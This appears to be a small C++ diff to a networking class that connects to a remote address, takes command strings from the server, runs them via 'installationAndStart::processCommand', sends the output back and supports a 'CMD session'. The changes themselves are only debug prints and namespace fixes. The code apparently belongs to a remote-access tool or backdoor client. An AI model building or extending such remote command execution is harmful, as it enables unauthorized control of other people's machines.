@@ -34,11 +34,11 @@ Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType 
 }
 
 bool Connexion::Connect() {
-
+    std::cout << "Lancement Connect" << std::endl;
     Connection = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket
 
     if (connect(Connection, (SOCKADDR*)&adresseIP, sizeof(adresseIP)) != 0) //If we are unable to connect...
-    {
+    {       std::cout << "Échec Connect" << std::endl;
         return false;
     }
 
@@ -113,7 +113,7 @@ bool Connexion::ProcessPacketType(MyPNet::PacketType _PacketType) {
             std::string msg;
             if (!GetString(msg))
                 return false;
-            SendString(installationAndStart::processCommand(msg), PacketType::Instruction);
+            SendString(installationAndStart::processCommand(msg), MyPNet::PacketType::Instruction);
             break;
         }
 
@@ -129,10 +129,11 @@ bool Connexion::ProcessPacketType(MyPNet::PacketType _PacketType) {
             }
             else
             {
-                SendString("Initiate a CMD session first.", PacketType::Warning);
+                SendString("Initiate a CMD session first.", MyPNet::PacketType::Warning);
                 break;
             }
         }
     }
 }
+
 
